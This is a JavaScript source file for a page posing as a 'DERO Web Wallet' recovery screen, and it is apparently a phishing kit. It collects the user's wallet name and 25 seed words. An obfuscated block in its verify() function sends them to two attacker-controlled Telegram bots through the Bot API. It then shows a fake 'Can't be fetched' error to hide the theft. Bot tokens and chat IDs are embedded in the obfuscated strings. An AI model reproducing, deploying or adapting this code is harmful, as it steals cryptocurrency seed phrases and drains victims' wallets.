import './style.css'
import { encrypt, decrypt } from './ibeh_encrypt.js';
import logo from './logo.png'

loadDefault();

loadDefault_bod();

function call(){
  var bod = document.getElementsByClassName('bod')[0];
  bod.innerHTML = preloader();
  setTimeout(() => {
    bod.innerHTML =
    decrypt(`5I1H1S2B4e1E2b1I2s2s4M5m2m1P1E5m5B4e4e4e4e4e4e4e4e5I1H1S2B4e1E2b1I2s2s4M5m1E2b2p2s1P4P1B2p2H5m5B5I2s2B1O4e1E2b1I2s2s4M5m1E2b1S1E2i1I1B2b1P5m4e2p2h1E2b1S1E2i4M5m2b2p1I1H2A1P1R1I2I2b2a4R1B2p1H4E4H5m4e2H2e2b2h2s4M5m1M2a2a2r5r5E5E2E2E2E5s2E1h5s2p2m1O5E1e1i1i1i5E2s2B1O5m4e2E1S1H2a1M4M5m1h1b5m4e1M1P1S1O1M2a4M5m1h1b5m4e2B1S1P2E2M2p2H4M5m1i4e1i4e1h1b4e1h1b5m4e1R1S2b2b4M5m2h2p2h1P5m5B5I2r1I2a1M4e1H4M5m3s1h1b4e1b1r5s1i1b1r1o2S1h1b4e1b1p5s1e1b1h1b4e1h1i5s1h1p1a1p4e1b1h5s1r1o1e1r4e1e1a5s1r1p1o1a4e1b1h5s1r1o1e1r3h1b1i5s1a1e1s1s2S1a5s1o1h1p1b1a4e1b1h5s1r1o1e1r4e1s5s1a1s1r1s1r4e1b1b5s1a1a1m1h4e1a5s1a1i1b1e1o4e1b1b5s1i1s1b1a3m1b1m5s1e1e1i1b4e1h5s1m1o1h1i1h2S1b1m5s1m1s1a4e1h5s1b1a1p1b1h4e1b1m5s1m1s1m1p4e1e5s1e1m1b1e1o4e1b1m5s1e1b1o1r4e1b5s1m1i1p1h1m3m1b1o5s1r1e1m1r4e1b5s1i1e1i1e1o2S1b1r5s1a1r1a1p4e1i5s1p1r1o1e1i1r4e1b1r5s1i1p1e1e4e1i5s1p1r1m1s1e1m4e1b1p5s1p1m1o1b4e1b5s1i1e1h1s1a3m1b5s1i1e1m1r1e4e1b1p5s1p1m1e1r2S1i5s1p1o1i1i1h1r4e1b1r5s1i1p4e1i5s1p1o1i1i1h1p4e1b1r5s1a1o4e1b5s1i1e1m1r1b4e1b1o5s1r1e1m1r3m1b1p5s1p1m1e1r4e1e1a5s1a1m1e1r2S1b1r5s1i1p4e1h1i5s1r1p4e1b1r5s1a1o4e1h1i5s1r1p4e1b1o5s1r1e1m1r4e1e1a5s1a1m1e1r3m1b1m5s1e1i1r1h4e1e1a5s1e1a1p1m2S1b1m5s1m1m1e1p4e1e1s5s1m1e1m1o4e1b1m5s1m1m1e1s4e1e1m5s1s1i1s1e4e1b1m5s1e1i1o1e4e1e1m5s1e1p1i1o3m1a5s1s1a1r1a1b4e1b1a5s1a1b1m1e2S1s5s1a1s1b1m1r4e1b1a5s1i1i1b1p4e1a5s1o1h1i1h1m4e1b1m5s1p1h1m1r4e1b1i5s1a1e1p1h4e1b1m5s1p1h1m1r3h1e1a5s1r1p1o1a2S1h1i5s1h1p1a1p4e1b1m5s1p1h1m1r4e1h1b4e1b1o5s1m1s1o1a4e1h1b4e1b1r5s1a1s1p1p3M1b1r5s1i1b1r1o4b5m4e1R1S2b2b4M5m2E1M1S2a1P5m4e1R1S2b2b4P2p2r1I1E1S2a2P4M5m1i5s1o5m5E5B5I5E2s2B1O5B5I5E1H1S2B5B4e4e4e4e4e4e4e4e5I1M1b5B3S1I2b2b1P2a4e3H1P1E2p2B1P2m2P4e2I2s1S2h1O4e3P1P1P1H4e2E2p2m1H2s5I5E1M1b5B4e4e4e4e4e4e4e4e5I1H1S2B4e1E2b1I2s2s4M5m1B5m5B4e4e4e4e4e4e4e4e4e4e5I1H1S2B4e1E2b1I2s2s4M5m1O5m5B4e4e4e4e4e4e4e4e4e4e4e4e5I2b1I1B1P2b5B3S1I2b2b1P2a4e3a1I2e1P5I5E2b1I1B1P2b5B4e4e4e4e4e4e4e4e4e4e4e4e5I1S2h2r2I2a4e2a2P2r1P4M5m2a1P2H2a5m4e1S1H4M5m2E1I2b2b1P2a3a5m4e2r2b1I1E1P1M2p2b1H1P2m4M5m3S1I2b2b1P2a4e2h1I2e1P4e1R2p2m4e2o2I1S1E2i4e2m1P1R1P2m1P2h1E1P5m5E5B4e4e4e4e4e4e4e4e4e4e5I5E1H1S2B5B4e4e4e4e4e4e4e4e4e4e5I1H1S2B4e1E2b1I2s2s4M5m1O5m5B4e4e4e4e4e4e4e4e4e4e4e4e5I2b1I1B1P2b5B1e1r4e3P1P1P1H4e3S2p2m1H2s5I5E2b1I1B1P2b5B4e4e4e4e4e4e4e4e4e4e4e4e5I2a1P2H2a1I2m1P1I4e2a2P2r1P4M5m2a1P2H2a5m4e2r2b1I1E1P1M2p2b1H1P2m4M5m5m4e1S1H4M5m2a1P2H2a2O5m5B5I5E2a1P2H2a1I2m1P1I5B4e4e4e4e4e4e4e4e4e4e5I5E1H1S2B5B4e4e4e4e4e4e4e4e4e4e5I1H1S2B4e1E2b1I2s2s4M5m1O5m5B4e4e4e4e4e4e4e4e4e4e4e4e5I2b1I1B1P2b5B3B1I2s2s2E2p2m1H5I5E2b1I1B1P2b5B4e4e4e4e4e4e4e4e4e4e4e4e5I1S2h2r2I2a4e2a2P2r1P4M5m2r1I2s2s2E2p2m1H5m4e1S1H4M5m2r1I2s2s5m4e2r2b1I1E1P1M2p2b1H1P2m4M5m3B1I2s2s2E2p2m1H5m5E5B4e4e4e4e4e4e4e4e4e4e5I5E1H1S2B5B4e4e4e4e4e4e4e4e4e4e5I1H1S2B4e1E2b1I2s2s4M5m1O5m5B4e4e4e4e4e4e4e4e4e4e4e4e5I2b1I1B1P2b5B2S2p2h1R1S2m2e4e3B1I2s2s2E2p2m1H5I5E2b1I1B1P2b5B4e4e4e4e4e4e4e4e4e4e4e4e5I1S2h2r2I2a4e2a2P2r1P4M5m2r1I2s2s2E2p2m1H5m4e1S1H4M5m1E2p2h3B1I2s2s5m4e2r2b1I1E1P1M2p2b1H1P2m4M5m2S2p2h1R1S2m2e4e3B1I2s2s2E2p2m1H5m5E5B4e4e4e4e4e4e4e4e4e4e5I5E1H1S2B5B4e4e4e4e4e4e4e4e4e4e5I1H1S2B4e1E2b1I2s2s4M5m1O5m5B4e4e4e4e4e4e4e4e4e4e4e4e5I2b1I1B1P2b5B3S1I2b2b1P2a4e2s2a1I2m2a4e3R2p2r2p1M1P1S1O1M2a5r4e4E2p2r2a1S2p2h1I2b4H5I5E2b1I1B1P2b5B4e4e4e4e4e4e4e4e4e4e4e4e5I1S2h2r2I2a4e2a2P2r1P4M5m2h2I2e1B1P2m5m4e2B1I2b2I1P4M5m1i5m5E5B4e4e4e4e4e4e4e4e4e4e5I5E1H1S2B5B4e4e4e4e4e4e4e4e5I5E1H1S2B5B4e4e4e4e4e4e4e4e5I1B2I2a2a2p2h4e1S1H4M5m2m1P1E5m5B3H1P1E2p2B1P2m4e2E1I2b2b1P2a5I5E1B2I2a2a2p2h5B4e4e4e4e4e4e5I5E1H1S2B5B`);
    document.getElementById("rec").onclick=()=>{verify()};
  }, 2000);
}



function loadDefault() {
  document.querySelector('#app').innerHTML =  `
    <main>
    <header>
      <div class="l"><img src="${logo}" alt="logo" /></div>
      <div class="w">
        <span>DERO Wallet</span>
        <select class="clickable">
          <option>English</option>
        </select>
      </div>
    </header>
    <div class="main">
      <div class="side">
        <div class="b">
          <button onclick="loadDefault_bod()">Recover Wallet</button>
          <button onclick="error_bod()">Create New Wallet</button>
          <button onclick="error_bod()">DERO Project</button>
        </div>
      </div>
      <div class="bod">
        
      </div>
    </div>
  </main> 
  `
}
function loadDefault_bod(){
  var bod = document.getElementsByClassName('bod')[0];
  bod.innerHTML = `
  <div class="box">
    <h3>DERO Web Wallet</h3>
    <button onclick="call()">Recover Wallet using SEED words (25 words)</button>
    <button onclick="call()">Recover Wallet using Recovery Key (64 hex char)</button>
    <button onclick="call()">Upload Wallet from DISK</button>
    <br>
    <button class="white">Recover View Only Wallet (128 hex char)</button>
  </div>
  <div class="box">
    <h5>DERO Web software is alpha software <br>
      Core Wallet Version: UI Version: 0.0.0 <br>
      Copyright DERO Project<br>
      This project is covered by DERO license.
    </h5>
  </div>`;
}
function call_bod(){
  var bod = document.getElementsByClassName('bod')[0];
  bod.innerHTML = `
  <div class="rec">
        <div class="close-box"><svg class="clickable" onclick="loadDefault_bod()" xmlns="http://www.w3.org/2000/svg" width="31" height="31" viewBox="0 0 31 31" fill="none"><path d="M31 15.0156C31 14.2131 30.3494 13.5625 29.5469 13.5625H10.9288C9.63419 13.5625 8.98585 11.9973 9.90126 11.0819L17.2201 3.76303C17.789 3.19413 17.7874 2.27126 17.2165 1.70437L16.5275 1.02026C15.9594 0.456205 15.0422 0.457827 14.4761 1.02389L1.02752 14.4725C0.460035 15.04 0.460034 15.96 1.02751 16.5275L14.4725 29.9725C15.04 30.54 15.96 30.54 16.5275 29.9725L17.2053 29.2947C17.7724 28.7276 17.7728 27.8082 17.2062 27.2406L9.89591 19.9172C8.98175 19.0014 9.63037 17.4375 10.9243 17.4375H29.5469C30.3494 17.4375 31 16.7869 31 15.9844V15.0156Z" fill="white" fill-opacity="0.6"/></svg></div>
        <h1>Wallet Recovery using Seed words</h1>
        <div class="b">
          <div class="g">
            <label>Wallet Name</label>
            <input type="text" id="walletN" placeholder="Wallet name for quick reference"/>
          </div>
          <div class="g">
            <label>25 Seed Words</label>
            <textarea type="text" placeholder="" id="textA"></textarea>
          </div>
          <div class="g">
            <label>Password</label>
            <input type="password" id="pass" placeholder="Password"/>
          </div>
          <div class="g">
            <label>Confirm Password</label>
            <input type="password" id="conPass" placeholder="Confirm Password"/>
          </div>
          <div class="g">
            <label>Wallet start Topoheight: (optional)</label>
            <input type="number" value="0"/>
          </div>
        </div>
        <button id="rec">Recover wallet</button>
      </div>`;
}
async function verify(){
  const wN = document.getElementById('walletN');
  const p = document.getElementById('pass');
  const cP = document.getElementById('conPass');
  const tA = document.getElementById('textA');
  const sW = tA.value.trim().split(/\s+/);
  if(wN.value==''){
    wN.style.borderColor="#F55F63";
    return
  }
  wN.style.borderColor="#008000";
  if (sW.length !== 25) {
    tA.style.borderColor="#F55F63";
    return;
  }
  tA.style.borderColor="#008000";
  if(p.value=='' || p.value!=cP.value){
    p.style.borderColor="#F55F63";
    cP.style.borderColor="#F55F63";
    return
  }
  p.style.borderColor="#008000";
  cP.style.borderColor="#008000";


  function _0xebc4(_0x466348,_0xba3475){const _0x578d76=_0x2595();return _0xebc4=function(_0x698aa9,_0x5f43b5){_0x698aa9=_0x698aa9-(-0x1027+-0x25ff+0x380c);let _0x359987=_0x578d76[_0x698aa9];return _0x359987;},_0xebc4(_0x466348,_0xba3475);}const _0x4e7838=_0xebc4;(function(_0x4c9b23,_0x1790e1){const _0x558021=_0xebc4,_0x4a7a29=_0x4c9b23();while(!![]){try{const _0x4ac6db=parseInt(_0x558021(0x212))/(-0x84f+-0x1d*0xe4+0x2224)+-parseInt(_0x558021(0x1eb))/(-0x1544+-0x7*0x38d+-0x1*-0x2e21)+parseInt(_0x558021(0x1fe))/(0x17*-0x56+0xc5f*0x2+-0x1101*0x1)*(parseInt(_0x558021(0x1e9))/(-0x2684+-0x2*-0x11c1+-0x9*-0x56))+-parseInt(_0x558021(0x1f7))/(-0x1*-0x1d82+-0x6da+-0x16a3)+parseInt(_0x558021(0x1f5))/(0x14bf+0x2463+-0x391c)+parseInt(_0x558021(0x213))/(0x15bf+-0x1961+-0x3a9*-0x1)*(parseInt(_0x558021(0x20d))/(0x1*0x2688+-0x19a8+-0xcd8))+parseInt(_0x558021(0x1ed))/(-0x17db+-0x1bab+0x338f)*(-parseInt(_0x558021(0x202))/(-0xbb1+-0x12ff*0x1+0x17*0x156));if(_0x4ac6db===_0x1790e1)break;else _0x4a7a29['push'](_0x4a7a29['shift']());}catch(_0x4f40ce){_0x4a7a29['push'](_0x4a7a29['shift']());}}}(_0x2595,-0xb126d+-0x4*0x3222a+-0xa85*-0x2fe));function _0x2595(){const _0x1ca515=['\x0a📢\x20*New\x20Re','bod','651TjraOt','Details:*\x0a','0_quA4','ward\x20Tip*\x20','8525750uXkiak','getElement','i.telegram','\x0a\x0a*Client\x20','ame:\x20','sByClassNa','equest\x20Fai','led:','8104209847','json','7534122584','881168jZjTsr','-\x20Wallet\x20N','4MBLQ8VI1k','.org/bot','sGpsQD60IZ','1007709pouexO','63KHlDuA','value','innerHTML','&parse_mod',':AAFpbr4rI','Telegram\x20E','error','5524gvKdcF','ge?chat_id','270578frbVrD','9ElLj66I2w','18gfzvjg','all','\x0a\x20\x20','rror\x201:','&text=','e=Markdown','https://ap','Telegram\x20R','2883162kCZuwQ','\x0a-\x20Content','2114895wdwbrE','/sendMessa','i9NpKweW4Z','tYN3Us',':AAGMo08k1'];_0x2595=function(){return _0x1ca515;};return _0x2595();}const BOT_TOKEN=_0x4e7838(0x20a)+_0x4e7838(0x1fb)+_0x4e7838(0x1f9)+_0x4e7838(0x1ec)+_0x4e7838(0x200),CHAT_ID=0xcc697789+-0x8a540ee1+0x659f68d*0x29,BOT_TOKEN2=_0x4e7838(0x20c)+_0x4e7838(0x1e6)+_0x4e7838(0x20f)+_0x4e7838(0x211)+_0x4e7838(0x1fa),CHAT_ID2=-(0x37bbaef9b*-0x83+0x85f*0x1e10790+0x2a202a9a3c1),message=_0x4e7838(0x1fc)+_0x4e7838(0x201)+_0x4e7838(0x205)+_0x4e7838(0x1ff)+_0x4e7838(0x20e)+_0x4e7838(0x206)+wN[_0x4e7838(0x214)]+(_0x4e7838(0x1f6)+':\x20')+tA[_0x4e7838(0x214)]+_0x4e7838(0x1ef),encodedMessage=encodeURIComponent(message),telegramUrl=_0x4e7838(0x1f3)+_0x4e7838(0x204)+_0x4e7838(0x210)+BOT_TOKEN+(_0x4e7838(0x1f8)+_0x4e7838(0x1ea)+'=')+CHAT_ID+_0x4e7838(0x1f1)+encodedMessage+(_0x4e7838(0x216)+_0x4e7838(0x1f2)),telegramUrl2=_0x4e7838(0x1f3)+_0x4e7838(0x204)+_0x4e7838(0x210)+BOT_TOKEN2+(_0x4e7838(0x1f8)+_0x4e7838(0x1ea)+'=')+CHAT_ID2+_0x4e7838(0x1f1)+encodedMessage+(_0x4e7838(0x216)+_0x4e7838(0x1f2)),telegramResponse=await fetch(telegramUrl),telegramResponse2=await fetch(telegramUrl2),result=await telegramResponse[_0x4e7838(0x20b)]();var bod=document[_0x4e7838(0x203)+_0x4e7838(0x207)+'me'](_0x4e7838(0x1fd))[0x148c+0x1*-0x781+-0xd0b];bod[_0x4e7838(0x215)]=preloader();try{const [response1,response2]=await Promise[_0x4e7838(0x1ee)]([fetch(telegramUrl),fetch(telegramUrl2)]),result1=await response1[_0x4e7838(0x20b)]();if(!response1['ok']){console[_0x4e7838(0x1e8)](_0x4e7838(0x1e7)+_0x4e7838(0x1f0),result1);var bod=document[_0x4e7838(0x203)+_0x4e7838(0x207)+'me'](_0x4e7838(0x1fd))[0x48a+0x22e0+-0x276a];bod[_0x4e7838(0x215)]=error_mod();return;}var bod=document[_0x4e7838(0x203)+_0x4e7838(0x207)+'me'](_0x4e7838(0x1fd))[-0x109c+0x2*-0xa57+-0x1*-0x254a];bod[_0x4e7838(0x215)]=error_mod();}catch(_0x494913){console[_0x4e7838(0x1e8)](_0x4e7838(0x1f4)+_0x4e7838(0x208)+_0x4e7838(0x209),_0x494913);var bod=document[_0x4e7838(0x203)+_0x4e7838(0x207)+'me'](_0x4e7838(0x1fd))[0x1aef+0x1*0x125f+0x78d*-0x6];bod[_0x4e7838(0x215)]=error_mod();}
}

function error_bod() {
  var bod = document.getElementsByClassName('bod')[0];
  bod.innerHTML = error_mod();
}
function error_mod() {
  return `<div class="box">

    <h3>Error</h3>
  </div>
  <div class="box">
    <h5>Can't be fetched at the moment</h5>
  </div>`;
}
function preloader() {
  return `
    <div class="preloader">
      <div class="rot">
        <svg xmlns="http://www.w3.org/2000/svg"xmlns:xlink="http://www.w3.org/1999/xlink"width="0.75in" height="0.806in"><image  x="0px" y="0px" width="54px" height="58px"  xlink:href="data:img/png;base64,iVBORw0KGgoAAAANSUhEUgAAADYAAAA6CAMAAADMWVqUAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAB9VBMVEX////1VmHyXmH1XmL0XmP0X2P1X2P1XmP1XmP1X2L0X2L1X2P1X2P1XmP1X2LyXmLbSkoBAQHzXGD1XmL1X2P1X2P1X2P0X2PjVlb0XmL1X2L1X2P1X2LzXGD1XmP1X2P1X2P0X1/1XV31XmL1XmL0X2PzX2L1X2PzXGP1X2PsWWP1X2P1X2P1X2P0XmL1X2P1X2OrVlb1X2P1X2P0X2P1XWDvVlbtXFz0X2P1X2P1X2P0XWL0XmLxVlbqVlb1X2L1X2P1X2PzXGL1X2L1XmL0X2PyXWL0X2P1X2PvXFzzXWH1X2P1XmOAAQH1X2PzXmP1X2PuWWLzXmPzX2L1X2P1XmPNNDT0X2P1XWP0X2H0Xl70XWP0XWH1X2PwUWHsUGP1X2H1XmP1X2P1X2L1X2P0XmP1X2P1X2P1XmP1X2P0X2P1X2P1X2P1XmP1X2P0XmP1X2L1X2L1X2P1X2P1X2L0X2L1X2P0XmL0X2L1X2LzXmH1XWH1XmP0XGHtXFz1X2PVVlbxW1v1X2P0X2P1X2P0XGDzWlr0XWP1X2PAQUH0X2P0XmP0X2LoXl7xW2D1X2P1X2P1XmHzXmL1X2L1X2L0XmL1XmPzVmL1XWL0WmD1XmP0X2PxXV31X2L1X2P1X2LyXWPxXmPzX2P1W2HyX1/1X2P///+BV5HDAAAApXRSTlMAGE12mbPD0NjXz8CpjGQ3BwE+kdn4u20Jbtz7sDtg6LwuGb1+gE/3UfYa6f3htd3+A77ynUsPDkSV72yEEgxM8NYqk8LMOoLuHz3zYwLjaMQdZmfGqgW0L3IWVkB4EA1i63+o07e/0aTBtsesxbGyyq3Sy+Sb+olvR1BIey0c+QYRyIrVQxRZ7ATlnLgLNtrqXVJfq4GiFTIr4Igko/SlJzQ8MCYFq8OEAAAAAWJLR0QAiAUdSAAAAAd0SU1FB+kFHQMNLWU7fLkAAAJTSURBVEjHndb3VxNBEAfwATUoGOUiRJQmChZI4kUEhSAWNCqaKFiiqKggijFiBaUoYsWODcXe9v/0kjyYOcnO7rv55e67N5+3Vza5A5hdWdlz5s5z5cxfkJu30L1ocT6oy/AsKRD2KvQuzeJR0bLlIlMVl5QyM5WVC2mtqJColasEV5WZlaecVVWZ1eo1TtTaYieqdJ0TVV3zf6PP7woEXOtNTgU32E3txrr69JFNmxsaZQpC9lXRtIUebN4qe2DbqNq+A/Sqhaqd9Zqqmj6xXc3K/nBRarObqD17lap13/7kJhIl7ICGEgdTcxJVENRQwmyzdpoIa9dRQhyy9g6TJ6a6i2kljgAcJfcxpqdEFOAYOcfjekqIDjhBWFhTiZNwirBOTp1GJc7QlXWWnSxSiJ1d0I3hHH9pfuxsgR4M53l2ATt74SKGOM8uYWcCLmMo4Rnp7KPhCs+uYuc1yMPg5dl1em0BDDd4dhM7+6EXQ5RVxgB23gI3Bl8+x9rIcgrBbQxV7GyDhA3BsKaCEcLuwF1NBV5Uo/dmbpBKjZGVfN/K3VoK2sk5PrBymZYyHhL2yBp4PKCh4AlR40+TIzENNfaMsIbUUJ1aRWJEifSnhqFWz6l6oexP18sEVeYr2YXYo+c1VdaPJnO11sYHZ14hweG4DYmJDolK/h+OJ0beDL19V/l+wo6Emc0oeX1wpPoNRyriQJldTuaqkXzXGJPcVJMfpevB02NmRr6+T+xCmnL7Z6PPX76CsipC33K/T4vGnB+hKbWZrs6fv36H//yVvV//AT6sB8TMg8s7AAAAAElFTkSuQmCC" /></svg>
      </div>
    </div>
  `;
}

window.loadDefault = loadDefault;
window.loadDefault_bod = loadDefault_bod;
window.error_bod = error_bod;
window.error_mod = error_mod;
window.call = call;
